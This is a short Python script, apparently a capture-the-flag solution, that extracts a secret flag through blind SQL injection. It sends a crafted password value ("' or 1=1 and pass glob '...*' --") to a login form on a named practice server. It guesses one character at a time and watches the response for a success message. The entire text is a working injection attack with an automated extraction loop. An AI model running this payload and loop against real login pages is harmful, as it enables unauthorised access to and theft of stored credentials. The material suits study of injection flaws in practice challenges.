import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

pre = 'FLAG_'
payload = {}
flag = pre


for i in range(16):
	print 'now' + str(i) + 'counts'
	for c in list(chars):
		ps = "' or 1=1 and pass glob '" + flag + c + "*' --"
		print ps
		payload = {'id': 'admin', 'pass': ps}
		if requests.post('http://ctfq.sweetduet.info:10080/~q6/', data=payload).text.count('Congratulations!'):
			flag = flag + c
 			print flag
 			break

